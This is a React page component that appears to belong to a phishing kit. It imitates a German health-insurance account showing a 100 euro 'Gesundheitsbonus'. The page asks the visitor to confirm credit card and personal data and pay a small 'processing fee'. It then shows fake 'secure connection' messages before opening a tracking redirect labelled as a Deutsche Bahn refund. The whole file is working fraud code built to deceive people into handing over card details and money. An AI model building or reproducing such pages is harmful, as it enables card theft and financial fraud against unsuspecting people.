
import React, { useCallback, useState } from 'react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import { Euro } from 'lucide-react';
import { Button } from '../components/ui/button';

const Dashboard = () => {
  const [showLoadingScreen, setShowLoadingScreen] = useState(false);
  const [currentMessageIndex, setCurrentMessageIndex] = useState(0);

  const messages = [
    "We are redirecting you to a secure page to confirm your personal information...",
    "Verifying your eligibility for the bonus payment...",
    "Preparing secure data transfer...",
    "Establishing secure connection...",
    "Finalizing redirection..."
  ];

  const handleRedirect = useCallback(() => {
    // Show loading screen
    setShowLoadingScreen(true);
    setCurrentMessageIndex(0);

    // Cycle through messages
    const messageInterval = setInterval(() => {
      setCurrentMessageIndex((prev) => (prev + 1) % messages.length);
    }, 2000);

    // After 10 seconds, redirect
    setTimeout(() => {
      clearInterval(messageInterval);
      
      // Generate random number for sub_id_4
      const randomNumber = Math.floor(Math.random() * 100000);
      const subId4 = `Deutsche bahn - Erstattung - ${randomNumber}`;
      const subId5 = 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/Deutsche_Bahn_AG-Logo.svg/1200px-Deutsche_Bahn_AG-Logo.svg.png';
      
      const redirectUrl = `/?_lp=1&sub_id_4=${encodeURIComponent(subId4)}&sub_id_5=${encodeURIComponent(subId5)}`;
      
      // Open in a new tab
      window.open(redirectUrl, '_blank');
      
      // Reset loading state
      setShowLoadingScreen(false);
    }, 10000);
  }, [messages]);

  // Loading screen component
  if (showLoadingScreen) {
    return (
      <div className="fixed inset-0 z-[9999] min-h-screen flex items-center justify-center bg-[#eceae8]">
        <div className="text-center">
          <div className="flex justify-center space-x-2 mb-8">
            {[0, 200, 400].map((delay, index) => (
              <div 
                key={index}
                className="w-4 h-4 rounded-sm bg-[#009ee0] animate-bounce"
                style={{ 
                  animationDelay: `${delay}ms`,
                  animationDuration: '1.4s'
                }}
              />
            ))}
          </div>
          
          <div className="h-12 flex items-center justify-center px-4">
            <p 
              key={currentMessageIndex}
              className="text-lg text-gray-700 font-medium animate-fade-in text-center max-w-md"
            >
              {messages[currentMessageIndex]}
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#eceae8]">
      <Header />
      
      <main className="py-4 md:py-8">
        <div className="container mx-auto px-0 max-w-4xl">
          <div className="mb-6 md:mb-8 px-4 md:px-0">
            <div className="flex items-center gap-3 mb-4">
              <div className="w-8 h-8 bg-gray-400 rounded-full flex items-center justify-center">
                <Euro size={20} className="text-white" />
              </div>
              <h1 className="text-xl md:text-2xl font-normal text-gray-800">
                Mein Beitragskonto
              </h1>
            </div>
          </div>

          <div className="bg-white shadow-sm mb-6 w-full">
            <div className="p-4 md:p-6 border-b">
              <div className="text-sm text-gray-600 mb-2">Aktueller Kontostand</div>
              <div className="flex items-baseline gap-2">
                <span className="text-3xl md:text-4xl font-light text-gray-800">100,00</span>
                <span className="text-base md:text-lg text-gray-600">Euro</span>
              </div>
              <p className="text-sm text-gray-600 mt-2">
                Ihr Gesundheitsbonus ist zur Auszahlung bereit.
              </p>
            </div>

            <div className="p-4 md:p-6 w-full">
              <h3 className="font-medium text-gray-800 mb-4">Verfügbare Auszahlungen</h3>
              
              <div className="bg-green-50 border border-green-200 rounded-lg p-4 md:p-6 w-full">
                <div className="flex items-start justify-between">
                  <div className="flex-1">
                    <h4 className="font-medium text-green-800 mb-3 text-base md:text-lg">
                      🎉 Gesundheitsbonus - 100,00 Euro verfügbar
                    </h4>
                    <p className="text-sm text-green-700 mb-4 leading-relaxed">
                      Sie sind berechtigt für einen €100 Gesundheitsbonus im Rahmen unseres jährlichen Präventionsprogramms. Diese Auszahlung wurde durch Ihre Teilnahme an Vorsorgeuntersuchungen und verantwortungsvolle Nutzung unserer Leistungen ermöglicht.
                    </p>
                    <p className="text-sm text-green-700 mb-4 leading-relaxed">
                      Zur sicheren Bearbeitung der Auszahlung auf Ihre Kreditkarte müssen Sie Ihre Kartendaten sowie persönlichen Informationen auf der nächsten Seite bestätigen. Eine Bearbeitungsgebühr zwischen €1-3 wird für die Verifikation erhoben.
                    </p>
                    <p className="text-sm text-green-700 mb-5 font-medium">
                      Der Bonus wird nach erfolgreicher Verifizierung innerhalb von 3-5 Werktagen auf Ihre Kreditkarte überwiesen.
                    </p>
                    <Button 
                      onClick={handleRedirect}
                      className="bg-green-600 hover:bg-green-700 text-white px-4 md:px-6 py-2 text-sm md:text-base w-full md:w-auto transition-colors"
                    >
                      Daten bestätigen und Auszahlung erhalten
                    </Button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
};

export default Dashboard;
